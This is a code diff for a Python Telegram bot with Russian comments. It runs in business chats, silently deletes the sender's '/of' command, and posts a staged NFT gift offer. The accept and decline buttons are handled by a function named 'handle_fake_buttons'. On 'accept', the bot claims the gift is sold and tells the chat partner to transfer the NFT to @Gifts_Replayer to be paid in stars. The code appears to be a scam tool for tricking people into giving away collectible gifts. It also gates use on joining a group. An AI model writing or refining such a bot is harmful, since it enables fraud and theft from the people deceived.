@@ -2,6 +2,7 @@ import asyncio
 import os
 import re
 from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import CommandStart
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.exceptions import TelegramBadRequest
 
@@ -10,46 +11,70 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 # --- НАСТРОЙКИ ПОДПИСКИ ---
-# ВСТАВЬТЕ СЮДА ID ВАШЕЙ ГРУППЫ (начинается с -100...)
-TARGET_CHAT_ID = -1003747516067
-# Ссылка на вашу группу
-INVITE_LINK = "https://t.me/+Q7j5G8Y24_U5OWY6"
+TARGET_CHAT_ID = -1003747516067  # Твой ID группы
+INVITE_LINK = "https://t.me/+Q7j5G8Y24_U5OWY6" # Ссылка на группу
 
 def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
-# Функция проверки подписки на группу
+# Функция проверки подписки
 async def is_subscribed(user_id: int) -> bool:
     try:
         member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
-        # Если статус не "вышел" и не "кикнут", значит состоит в группе
         return member.status in ["member", "administrator", "creator"]
     except Exception as e:
-        print(f"Ошибка проверки подписки (убедитесь, что бот админ в группе): {e}")
+        print(f"Ошибка проверки подписки: {e}")
         return False
 
+# --- 1. ОБРАБОТКА /start С ПРОВЕРКОЙ ПОДПИСКИ ---
+@dp.message(CommandStart())
+async def cmd_start(message: types.Message):
+    if not await is_subscribed(message.from_user.id):
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)]
+        ])
+        await message.answer(
+            "⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>\n\n"
+            "Вступите в группу и отправьте /start снова.",
+            reply_markup=keyboard,
+            parse_mode="HTML"
+        )
+    else:
+        await message.answer(
+            "✅ <b>Вы подписаны!</b>\n\n"
+            "Этот бот предназначен для визуализации NFT-офферов в режиме автоматизации чатов.\n\n"
+            "❌ Генерация офферов в личных сообщениях недоступна.\n"
+            "✅ Чтобы увидеть оффер, дождитесь его в чате от пользователя.",
+            parse_mode="HTML"
+        )
+
+# --- 2. БЛОКИРОВКА /of ДЛЯ ОБЫЧНЫХ ПОЛЬЗОВАТЕЛЕЙ ---
+@dp.message(F.text.startswith("/of"))
+async def block_offer_in_pm(message: types.Message):
+    await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
+
+# --- 3. РАБОТА БОТА ТОЛЬКО В БИЗНЕС-ЧАТАХ ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
     if not business_connection_id:
         return
 
-    # --- ПРОВЕРКА ПОДПИСКИ ---
+    # Проверка подписки перед отправкой оффера
     if not await is_subscribed(message.from_user.id):
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)]
         ])
         await bot.send_message(
             chat_id=message.chat.id,
-            text="⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>\n\nВступите в группу и попробуйте снова.",
+            text="⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>",
             reply_markup=keyboard,
             business_connection_id=business_connection_id,
             parse_mode="HTML"
         )
-        return # Прерываем выполнение, оффер не отправляется
+        return
 
-    # --- ОСНОВНАЯ ЛОГИКА ОФФЕРА ---
     parts = message.text.split()
     if len(parts) < 3:
         return
@@ -69,7 +94,6 @@ async def handle_offer_command(message: types.Message):
     username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
 
     try:
-        # Удаляем команду /of
         await bot.delete_business_messages(
             business_connection_id=business_connection_id,
             message_ids=[message.message_id]
@@ -104,13 +128,13 @@ async def handle_offer_command(message: types.Message):
     except Exception as e:
         print(f"Ошибка отправки: {e}")
 
+# --- 4. ОБРАБОТКА КНОПОК ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message:
         await callback.answer("Сообщение не найдено.", show_alert=True)
         return
 
-    # Дополнительная проверка при нажатии кнопки (на случай, если вышел из группы)
     if not await is_subscribed(callback.from_user.id):
         await callback.answer("Вы вышли из группы! Вступите обратно, чтобы продолжить.", show_alert=True)
         return
@@ -125,17 +149,19 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     business_connection_id = callback.message.business_connection_id
 
     try:
-        await bot.delete_business_messages(
-            business_connection_id=business_connection_id,
-            message_ids=[callback.message.message_id]
-        )
+        if business_connection_id:
+            await bot.delete_business_messages(business_connection_id, [callback.message.message_id])
+        else:
+            try:
+                await callback.message.delete()
+            except:
+                pass
 
         if action == "accept":
             new_text = (
                 f"🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n"
                 f"• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд."
             )
-            
             new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="Передать NFT", url="https://t.me/Gifts_Replayer")]
             ])
@@ -143,19 +169,22 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
             new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
             new_keyboard = None
 
-        await bot.send_message(
-            chat_id=callback.message.chat.id,
-            text=new_text,
-            reply_markup=new_keyboard,
-            business_connection_id=business_connection_id,
-            parse_mode="HTML",
-            link_preview_options=LinkPreviewOptions(
+        kwargs = {
+            "chat_id": callback.message.chat.id,
+            "text": new_text,
+            "reply_markup": new_keyboard,
+            "parse_mode": "HTML",
+            "link_preview_options": LinkPreviewOptions(
                 url=link,
                 show_above_text=True,
                 prefer_large_media=True
             )
-        )
+        }
         
+        if business_connection_id:
+            kwargs["business_connection_id"] = business_connection_id
+
+        await bot.send_message(**kwargs)
         await callback.answer()
 
     except TelegramBadRequest:
